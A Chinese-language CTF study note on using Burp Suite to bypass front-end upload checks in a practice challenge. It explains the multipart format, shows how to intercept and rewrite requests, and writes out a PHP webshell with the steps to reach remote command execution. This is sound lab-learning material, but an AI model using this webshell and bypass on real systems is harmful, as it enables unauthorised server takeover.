# 🗂 Web 笔记 20｜Burp 上传文件全攻略（multipart 格式 + 拦截改包 + Repeater）

> 记录自：qsnctf 上传题（40253）｜ 2026-08-12
> 适用：文件上传题、传马、绕过前端校验
> 一句话：上传 = 把文件塞进 multipart/form-data 请求，Burp 就是用来改这个请求的

---

## 一、先搞懂：上传请求长什么样（multipart 格式）

浏览器上传文件时，发的不是普通表单，是 **multipart/form-data**——一种「能把文件二进制塞进 HTTP 请求」的格式：

```
POST / HTTP/1.1
Host: 靶机
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabc123
                                                    ↑ 分隔线名字（随机生成）

------WebKitFormBoundaryabc123                      ← 一个文件段的开始
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: application/octet-stream
                                                    ← 空行
<?php system($_GET["c"]); ?>                       ← 文件内容
------WebKitFormBoundaryabc123                      ← 下一个字段
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryabc123--                    ← 结尾（多两个 --）
```

**结构三要素**：
| 部分 | 说明 |
|---|---|
| `boundary=xxx` | 分隔线名字，**body 里每一段都要以 `--boundary` 开头**，结尾 `--boundary--` |
| `name="upload_file"` | **表单字段名**（看页面表单 input 的 name） |
| `filename="shell.php"` | **文件名**（服务器按这个存） |

---

## 二、方法一：拦截改包（实战首选 ★）

**思路**：浏览器正常传一个允许的文件 → Burp 拦下 → 改文件名和内容 → 放行。

**手把手步骤**：
1. 浏览器（**走 Burp 代理**）打开上传页
2. 选一个普通图片（.gif/.png）点「上传」
3. **Burp 拦到请求**（Intercept 开着）——你会看到 multipart 格式的请求
4. **改两处**：
   - `filename="xxx.gif"` → `filename="shell.php"`（改文件名）
   - 文件内容（空行后的二进制乱码）→ 全选删掉，换成：
     ```
     <?php system($_GET["c"]); ?>
     ```
5. 点 **Forward** 放行
6. 看响应提示 → 访问 `/upload/shell.php?c=id` 验证

> 💡 为什么能改：**前端 JS 校验在浏览器端就结束了，Burp 改的是「到达服务器」的请求**——服务器只看到 .php，完全不查。

---

## 三、方法二：Repeater 手写（理解格式 + 自动化）

Burp → Repeater，粘贴模板（boundary 可随便换但要一致）：

```
POST / HTTP/1.1
Host: 靶机地址
Content-Type: multipart/form-data; boundary=----wb123
Content-Length: 200

------wb123
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET["c"]); ?>
------wb123
Content-Disposition: form-data; name="submit"

上传
------wb123--
```

**要点**：
- `boundary=----wb123` 和 body 里的 `------wb123` 必须**完全一致**
- 每段之间要有**空行**
- 结尾 `------wb123--`（末尾两个 `--` 表示结束）
- 中文「上传」直接填（Burp 会自动编码）——如果服务器不检查 submit 值，这段可以不要

---

## 四、常见坑（实测踩过/易踩）

| 坑 | 后果 | 解决 |
|---|---|---|
| boundary 不一致 | 服务器解析失败「文件没传上去」 | body 里每一处都和请求头里一致 |
| Content-Length 不对 | 请求截断/报错 | 手写时先随便填，Burp 会自动重算（或点 Update Content-Length） |
| 字段名写错 | 服务器找不到文件字段 | 看页面 HTML：`<input name="upload_file">` 的 name 就是字段名 |
| 忘了结尾 `--` | multipart 没闭合 | 最后一段后加 `------boundary--` |
| 中文 submit 值 | 乱码但通常无影响 | 服务器一般不检查，删掉这段也行 |

---

## 五、实战对照（40253 题）

```
页面:  <input type="file" name="upload_file"/>  → 字段名 upload_file
前端:  JS 只放 .jpg/.png/.gif                    → 浏览器正常传会被弹窗拦
解法:  拦截改包: 传 .gif 时改 filename="shell.php" + 内容换 PHP 马
      或 Repeater 手写 multipart 直接 POST
成功:  path: ./upload/shell.php
验证:  /upload/shell.php?c=id → uid=33(www-data)
```

---

## 六、速查卡（贴墙）

```
1. 看页面 input 的 name → 字段名
2. 浏览器正常传一个允许的 → 拦截改 filename 和内容 → Forward
3. 或 Repeater 手写 multipart（boundary 一致 + 段间空行 + 结尾 --）
4. 上传成功看回显路径 → 访问执行 → RCE
前端 JS 校验 = 纸老虎，Burp 改包直接绕
```
